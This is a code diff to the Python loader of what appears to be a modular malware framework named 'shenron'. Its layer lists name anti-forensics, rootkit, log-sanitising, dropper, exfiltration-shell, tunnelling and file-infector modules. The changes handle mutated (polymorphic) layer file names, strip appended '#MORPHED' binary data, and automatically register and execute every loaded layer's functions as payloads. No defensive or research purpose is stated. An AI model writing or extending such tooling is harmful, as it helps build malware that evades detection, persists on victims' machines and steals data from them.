@@ -9,7 +9,7 @@ LAYERS_DIR = Path(os.path.expanduser("~/projects/shenron/core/layers"))
 
 CATEGORIES = {
     "identity":    ["shenron_bio_replication","forged_bios_artifact","cognitive_replicator","stealth_mimic"],
-    "evasion":     ["anti_forensics_molt","airlock_quarantine_cloak","evasion_lure_illusion","mirror_loop_deflector","spectral_rootkit_shroud","dark_signature_morpher","stealth_log_sanitizer"],
+    "evasion":     ["anti_forensics_molt","airlock_quarantine_cloak","evasion_lure_illusion","mirror_loop_deflector","spectral_rootkit_shroud","dark_signature_morpher",],
     "payload":     ["payload_skinwalker","obfuscated_skinwalker_dropper","deadzone_payload","symbiote_payload","ethereal_payload_reanimator","recursive_payload_seedbank","transient_exfil_shell","void_gateway_tunnel"],
     "persistence": ["dormant_sleeper_seed","undead_memory_latch","memory_hijack_inheritor","shadow_system_rebuilder","self_sealing_nano_sandbox","poltergeist_file_infector"],
     "entropy":     ["quantum_entropy_distorter","entropy_flux_disruptor","entropy_anchor_dropper","neural_entropy_seeder","quantum_state_shuffler","quantum_trace_rewinder","quantum_entanglement_relay","synthetic_splinter_seed"],
@@ -22,8 +22,15 @@ _TYPE_TO_CAT = {layer: cat for cat, layers in CATEGORIES.items() for layer in la
 def _get_layer_type(filename):
     stem = Path(filename).stem
     parts = stem.split("_")
-    if len(parts) >= 2 and re.match(r"^[A-Za-z0-9]{6}$", parts[-1]):
-        return None
+    if len(parts) >= 2:
+        last = parts[-1]
+        # Mutation suffixes are 6 chars, mixed case with digits or mixed case
+        # Real words like "shroud", "cloak", "seed" are all lowercase, no digits
+        if re.match(r"^[A-Za-z0-9]{6}$", last):
+            has_upper = any(c.isupper() for c in last)
+            has_digit = any(c.isdigit() for c in last)
+            if has_upper or has_digit:
+                return None
     return stem
 
 def discover_canonical():
@@ -36,11 +43,23 @@ def discover_canonical():
     return {lt: sorted(paths, key=lambda p: len(p.name))[0] for lt, paths in candidates.items()}
 
 def _strip_binary(source):
-    cleaned = source.encode("utf-8", errors="replace").decode("utf-8")
-    cut = cleaned.find("#MORPHED")
-    if cut != -1:
-        cleaned = cleaned[:cut]
-    return re.sub(r"[---]", "", cleaned)
+    raw = source if isinstance(source, bytes) else source.encode("utf-8", errors="replace")
+    marker = b"#MORPHED"
+    idx = 0
+    while True:
+        pos = raw.find(marker, idx)
+        if pos == -1:
+            break
+        preceding = raw[max(0, pos-8):pos]
+        has_binary = any(b > 0x7e or (b < 0x09) or (0x0d < b < 0x20) for b in preceding)
+        if has_binary:
+            raw = raw[:pos]
+            break
+        idx = pos + len(marker)
+    cleaned = raw.decode("utf-8", errors="replace")
+    cleaned = cleaned.replace("\x00", "").replace("\ufffd", "")
+    cleaned = re.sub(r"[\x01-\x08\x0b\x0c\x0e-\x1f]", "", cleaned)
+    return cleaned
 
 def _make_shim_module(name):
     mod = types.ModuleType(name)
@@ -63,6 +82,32 @@ def load_layer(layer_type, path):
             sys.modules[shim] = _make_shim_module(shim)
     try:
         exec(compile(source, str(path), "exec"), mod.__dict__)
+        # Re-register mutation-named entries under canonical name
+        for reg_name in list(payload_registry.list_registered()):
+            if reg_name != layer_type and reg_name.startswith(layer_type + "_"):
+                payload_registry.register_payload(layer_type)(payload_registry.get(reg_name))
+                break
+        # Auto-register if still not picked up
+        if layer_type not in payload_registry.list_registered():
+            if hasattr(mod, "main") and callable(mod.main):
+                payload_registry.register_payload(layer_type)(mod.main)
+            else:
+                # No main() — wrap all public functions into one callable
+                fns = [
+                    v for k, v in mod.__dict__.items()
+                    if callable(v) and not k.startswith("_")
+                    and getattr(v, "__module__", None) == mod.__name__
+                ]
+                if fns:
+                    def _make_runner(functions):
+                        def _runner():
+                            for fn in functions:
+                                try:
+                                    fn()
+                                except Exception as e:
+                                    print("  [!] " + fn.__name__ + ": " + str(e))
+                        return _runner
+                    payload_registry.register_payload(layer_type)(_make_runner(fns))
         return True, None
     except SyntaxError as e:
         return False, "syntax error: " + str(e)
